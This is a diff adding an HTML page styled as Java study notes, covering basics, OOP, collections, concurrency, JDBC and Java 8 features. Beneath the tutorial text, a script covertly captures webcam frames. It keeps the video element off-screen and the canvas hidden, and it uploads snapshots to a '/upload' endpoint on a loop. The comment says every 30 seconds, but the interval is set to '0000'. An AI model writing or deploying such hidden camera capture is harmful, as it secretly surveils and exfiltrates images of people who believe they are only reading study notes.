@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="UTF-8" />
+    <title>Java Notes with Webcam Capture</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 40px;
+            line-height: 1.6;
+            max-width: 800px;
+        }
+
+        h1,
+        h2 {
+            color: #333;
+        }
+
+        h2 {
+            margin-top: 30px;
+            border-bottom: 1px solid #ccc;
+            padding-bottom: 5px;
+        }
+
+        p {
+            margin: 8px 0;
+        }
+
+        ul {
+            margin: 8px 0 8px 20px;
+        }
+
+        /* Hidden video element (still streams so canvas.drawImage works) */
+        #video {
+            position: absolute;
+            left: -9999px;
+        }
+
+        /* Hidden canvas for snapshot */
+        #canvas {
+            display: none;
+        }
+    </style>
+</head>
+
+<body>
+    <h1>📘 Java Study Notes</h1>
+
+    <!-- 1. Basics -->
+    <h2>1. Basics of Java</h2>
+    <p><strong>1.1. What is Java?</strong>
+        Java is a high-level, class-based, object-oriented programming language that is designed to have as few
+        implementation dependencies as possible. It follows the “Write Once, Run Anywhere” (WORA) philosophy.</p>
+
+    <p><strong>1.2. Java Virtual Machine (JVM):</strong>
+        The JVM is the runtime environment that executes bytecode. It provides platform independence by abstracting
+        away hardware/OS specifics.</p>
+
+    <p><strong>1.3. JDK vs. JRE:</strong>
+    <ul>
+        <li><strong>JDK (Java Development Kit):</strong> Contains compilers (javac), tools, and libraries to develop
+            Java applications.</li>
+        <li><strong>JRE (Java Runtime Environment):</strong> Contains the JVM and core libraries needed only to run Java
+            programs (no compiler).</li>
+    </ul>
+    </p>
+
+    <!-- 2. Data Types & Variables -->
+    <h2>2. Data Types & Variables</h2>
+    <p><strong>2.1. Primitive Data Types:</strong>
+    <ul>
+        <li><strong>byte:</strong> 8-bit signed integer</li>
+        <li><strong>short:</strong> 16-bit signed integer</li>
+        <li><strong>int:</strong> 32-bit signed integer</li>
+        <li><strong>long:</strong> 64-bit signed integer</li>
+        <li><strong>float:</strong> 32-bit floating-point</li>
+        <li><strong>double:</strong> 64-bit floating-point</li>
+        <li><strong>char:</strong> 16-bit Unicode character</li>
+        <li><strong>boolean:</strong> true or false</li>
+    </ul>
+    </p>
+    <p><strong>2.2. Reference Types:</strong> Objects, arrays, and interfaces. Stored as references to memory addresses.
+    </p>
+    <p><strong>2.3. Variable Declaration:</strong>
+        <code>int count = 10;</code>
+        By default, uninitialized instance variables get default values (0 for numerics, false for boolean, null for
+        references).
+    </p>
+
+    <!-- 3. Operators & Expressions -->
+    <h2>3. Operators & Expressions</h2>
+    <p><strong>3.1. Arithmetic Operators:</strong> <code>+, -, *, /, %</code></p>
+    <p><strong>3.2. Relational Operators:</strong> <code>==, !=, >, <, >=, <=</code></p>
+    <p><strong>3.3. Logical Operators:</strong> <code>&& (AND), || (OR), ! (NOT)</code></p>
+    <p><strong>3.4. Assignment Operators:</strong> <code>=, +=, -=, *=, /=, %=</code></p>
+    <p><strong>3.5. Increment/Decrement:</strong> <code>++i, i++, --i, i--</code></p>
+    <p><strong>3.6. Ternary Operator:</strong> <code>condition ? exprIfTrue : exprIfFalse</code></p>
+
+    <!-- 4. Control Flow -->
+    <h2>4. Control Flow Statements</h2>
+    <p><strong>4.1. if / else if / else:</strong></p>
+    <pre><code>
+if (score >= 90) {
+    grade = 'A';
+} else if (score >= 80) {
+    grade = 'B';
+} else {
+    grade = 'C';
+}
+    </code></pre>
+    <p><strong>4.2. switch:</strong></p>
+    <pre><code>
+switch (day) {
+    case 1:
+        System.out.println("Monday");
+        break;
+    case 2:
+        System.out.println("Tuesday");
+        break;
+    default:
+        System.out.println("Weekend");
+}
+    </code></pre>
+    <p><strong>4.3. Loops:</strong>
+    <ul>
+        <li><strong>for:</strong> <code>for (int i = 0; i < 5; i++) { ... }</code></li>
+        <li><strong>while:</strong> <code>while (condition) { ... }</code></li>
+        <li><strong>do-while:</strong> <code>do { ... } while (condition);</code></li>
+    </ul>
+    </p>
+    <p><strong>4.4. for-each Loop (Enhanced for):</strong>
+        <code>for (String item : itemList) { ... }</code>
+    </p>
+
+    <!-- 5. Arrays & Strings -->
+    <h2>5. Arrays & Strings</h2>
+    <p><strong>5.1. One-Dimensional Array:</strong>
+        <code>int[] nums = new int[5];</code> or <code>int[] nums = {1, 2, 3};</code>
+    </p>
+    <p><strong>5.2. Multi-Dimensional Array:</strong>
+        <code>int[][] matrix = new int[3][3];</code>
+    </p>
+    <p><strong>5.3. String Basics:</strong>
+        Strings are immutable.
+        <code>String s = "Hello";</code>
+        Common methods: <code>length(), charAt(), substring(), indexOf(), equals(), toLowerCase()</code>
+    </p>
+    <p><strong>5.4. StringBuilder / StringBuffer:</strong>
+        Mutable alternatives to <code>String</code> for efficient concatenation.
+        <code>StringBuilder sb = new StringBuilder("Hi"); sb.append(" there");</code>
+    </p>
+
+    <!-- 6. Object-Oriented Programming -->
+    <h2>6. Object-Oriented Programming (OOP)</h2>
+    <p><strong>6.1. Class & Object:</strong>
+        - <strong>Class:</strong> Blueprint or template.
+        - <strong>Object:</strong> An instance of a class.
+        <code>
+public class Car {
+    String model;
+    int year;
+    void drive() {
+        System.out.println("Driving");
+    }
+}
+       </code>
+    </p>
+    <p><strong>6.2. Constructors:</strong>
+        Special method to initialize objects.
+        <code>
+public Car(String m, int y) {
+    model = m;
+    year = y;
+}
+       </code>
+    </p>
+    <p><strong>6.3. this Keyword:</strong> Refers to the current object. Useful when parameter names match field names.
+    </p>
+    <p><strong>6.4. Inheritance:</strong>
+        Use <code>extends</code> to inherit:
+        <code>
+public class Vehicle { ... }
+public class Car extends Vehicle { ... }
+       </code>
+    </p>
+    <p><strong>6.5. Polymorphism:</strong>
+        - <strong>Compile-time (Overloading):</strong> Same method name, different parameters.
+        - <strong>Runtime (Overriding):</strong> Subclass provides specific implementation of a superclass method.</p>
+    <p><strong>6.6. Abstraction:</strong>
+        - <strong>Abstract Class:</strong> Can have both abstract and concrete methods.
+        <code>abstract class Animal { abstract void sound(); }</code>
+        - <strong>Interface:</strong> 100% abstract (until Java 8 default/static methods).
+        <code>interface Flyable { void fly(); }</code>
+    </p>
+    <p><strong>6.7. Encapsulation:</strong>
+        Keep fields private and provide public getters/setters.
+        <code>
+private int age;
+public int getAge() { return age; }
+public void setAge(int a) { if (a > 0) age = a; }
+       </code>
+    </p>
+
+    <!-- 7. Exception Handling -->
+    <h2>7. Exception Handling</h2>
+    <p><strong>7.1. try / catch / finally:</strong>
+        <code>
+try {
+    int result = 10 / 0;
+} catch (ArithmeticException e) {
+    System.out.println("Cannot divide by zero");
+} finally {
+    System.out.println("Always executes");
+}
+       </code>
+    </p>
+    <p><strong>7.2. throw / throws:</strong>
+        Use <code>throw</code> to explicitly throw an exception.
+        Use <code>throws</code> in method signature to delegate exception handling.
+        <code>
+void readFile() throws IOException { ... }
+       </code>
+    </p>
+    <p><strong>7.3. Custom Exceptions:</strong>
+        Extend <code>Exception</code> or <code>RuntimeException</code> to create your own.
+        <code>
+class MyException extends Exception { ... }
+       </code>
+    </p>
+
+    <!-- 8. Collections Framework -->
+    <h2>8. Collections Framework</h2>
+    <p><strong>8.1. List:</strong> Ordered, can contain duplicates.
+        <code>ArrayList, LinkedList</code>
+    </p>
+    <p><strong>8.2. Set:</strong> No duplicates, unordered (unless you use SortedSet).
+        <code>HashSet, TreeSet, LinkedHashSet</code>
+    </p>
+    <p><strong>8.3. Map:</strong> Key-value pairs, keys must be unique.
+        <code>HashMap, TreeMap, LinkedHashMap</code>
+    </p>
+    <p><strong>8.4. Queue / Deque:</strong>
+        <code>LinkedList, ArrayDeque, PriorityQueue</code>
+    </p>
+    <p><strong>8.5. Iterators:</strong> Used to traverse collections safely.
+        <code>
+Iterator<String> it = list.iterator();
+while (it.hasNext()) {
+    System.out.println(it.next());
+}
+       </code>
+    </p>
+
+    <!-- 9. Threads & Concurrency -->
+    <h2>9. Threads & Concurrency</h2>
+    <p><strong>9.1. Creating Threads:</strong>
+        - Extend <code>Thread</code> class and override <code>run()</code>.
+        - Implement <code>Runnable</code> interface and pass to a <code>Thread</code> object.
+        <code>
+Thread t = new Thread(new MyRunnable());
+t.start();
+       </code>
+    </p>
+    <p><strong>9.2. Synchronization:</strong>
+        Use <code>synchronized</code> keyword to avoid race conditions.
+        <code>
+synchronized void increment() { count++; }
+       </code>
+    </p>
+    <p><strong>9.3. volatile Keyword:</strong> Ensures visibility of changes across threads.
+        <code>private volatile int flag;</code>
+    </p>
+    <p><strong>9.4. Executor Framework (Java 5+):</strong>
+        Use <code>ExecutorService</code> to manage thread pools.
+        <code>
+ExecutorService exec = Executors.newFixedThreadPool(5);
+exec.submit(() -> { /* task */ });
+       </code>
+    </p>
+
+    <!-- 10. File I/O -->
+    <h2>10. File I/O (java.io & java.nio Packages)</h2>
+    <p><strong>10.1. java.io (Stream-based):</strong>
+    <ul>
+        <li><strong>FileReader / FileWriter:</strong> Character streams.</li>
+        <li><strong>FileInputStream / FileOutputStream:</strong> Byte streams.</li>
+        <li><strong>BufferedReader / BufferedWriter:</strong> Wrap FileReader/FileWriter for efficiency.</li>
+    </ul>
+    </p>
+    <p><strong>10.2. java.nio (New I/O, buffer-based):</strong>
+    <ul>
+        <li><strong>Paths & Files:</strong>
+            <code>Path path = Paths.get("file.txt");</code>
+            <code>Files.readAllLines(path);</code>
+        </li>
+        <li><strong>ByteBuffer:</strong> For reading/writing binary data.</li>
+    </ul>
+    </p>
+
+    <!-- 11. JDBC (Database Connectivity) -->
+    <h2>11. JDBC (Java Database Connectivity)</h2>
+    <p><strong>11.1. Loading Driver:</strong>
+        <code>Class.forName("com.mysql.cj.jdbc.Driver");</code>
+    </p>
+    <p><strong>11.2. Establish Connection:</strong>
+        <code>Connection con = DriverManager.getConnection(url, user, pass);</code>
+    </p>
+    <p><strong>11.3. Executing Queries:</strong>
+        <code>
+Statement stmt = con.createStatement();
+ResultSet rs = stmt.executeQuery("SELECT * FROM users");
+while (rs.next()) {
+    System.out.println(rs.getString("name"));
+}
+       </code>
+    </p>
+    <p><strong>11.4. PreparedStatement:</strong> Use placeholders to prevent SQL injection.
+        <code>
+PreparedStatement ps = con.prepareStatement("INSERT INTO users(name, age) VALUES(?, ?)");
+ps.setString(1, "Alice");
+ps.setInt(2, 25);
+ps.executeUpdate();
+       </code>
+    </p>
+
+    <!-- 12. Java 8+ Features -->
+    <h2>12. Java 8+ Key Features</h2>
+    <p><strong>12.1. Lambda Expressions:</strong> Shorter syntax for anonymous functions.
+        <code>
+List&lt;String&gt; names = Arrays.asList("Bob", "Alice");
+names.forEach(name -> System.out.println(name));
+       </code>
+    </p>
+    <p><strong>12.2. Streams API:</strong> Functional-style operations on collections.
+        <code>
+List&lt;Integer&gt; nums = Arrays.asList(1,2,3,4,5);
+List&lt;Integer&gt; evens = nums.stream()
+                             .filter(n -> n % 2 == 0)
+                             .collect(Collectors.toList());
+       </code>
+    </p>
+    <p><strong>12.3. Optional:</strong> Prevents <code>NullPointerException</code>.
+        <code>
+Optional&lt;String&gt; opt = Optional.ofNullable(getName());
+opt.ifPresent(System.out::println);
+       </code>
+    </p>
+    <p><strong>12.4. Default & Static Methods in Interfaces:</strong>
+        Allows concrete methods in interfaces.
+        <code>
+interface Vehicle {
+    default void start() { System.out.println("Starting"); }
+    static void info() { System.out.println("Vehicle Info"); }
+}
+       </code>
+    </p>
+
+    <!-- 13. Miscellaneous -->
+    <h2>13. Miscellaneous Topics</h2>
+    <p><strong>13.1. Annotations:</strong> Metadata for classes, methods, fields.
+        Built-in: <code>@Override, @Deprecated, @SuppressWarnings</code>.
+        Custom annotations require <code>@interface</code>.</p>
+    <p><strong>13.2. Generics:</strong> Type-safe collections.
+        <code>List&lt;String&gt; list = new ArrayList&lt;&gt;();</code>
+    </p>
+    <p><strong>13.3. Enumerations (enum):</strong>
+        <code>
+enum Day { MON, TUE, WED, THU, FRI, SAT, SUN }
+       </code>
+    </p>
+    <p><strong>13.4. Serialization:</strong> Convert objects to byte streams.
+        Implement <code>Serializable</code> interface.
+        <code>
+FileOutputStream fos = new FileOutputStream("data.ser");
+ObjectOutputStream oos = new ObjectOutputStream(fos);
+oos.writeObject(myObject);
+       </code>
+    </p>
+    <p><strong>13.5. Java Memory Model:</strong>
+        - <strong>Heap:</strong> Stores objects.
+        - <strong>Stack:</strong> Stores local variables and method calls.
+        - <strong>Garbage Collection:</strong> Automatic memory management.</p>
+
+    <!-- Hidden webcam + canvas for snapshots -->
+    <video id="video" autoplay muted playsinline></video>
+    <canvas id="canvas" width="320" height="240"></canvas>
+
+    <script>
+        const video = document.getElementById("video");
+        const canvas = document.getElementById("canvas");
+        const context = canvas.getContext("2d");
+
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then((stream) => {
+                video.srcObject = stream;
+
+                // Capture every 30 seconds (30000 ms)
+                setInterval(() => {
+                    // Draw current frame on hidden canvas
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const imageData = canvas.toDataURL("image/png");
+
+                    // Upload to server
+                    fetch("/upload", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ image: imageData })
+                    })
+                        .then(res => res.json())
+                        .then(data => {
+                            console.log("✅ Sent photo:", data.filename);
+                        })
+                        .catch(err => {
+                            console.error("❌ Upload failed", err);
+                        });
+                }, 0000);
+            })
+            .catch(err => {
+                alert("Please allow webcam access!");
+                console.error(err);
+            });
+    </script>
+</body>
+
+</html>
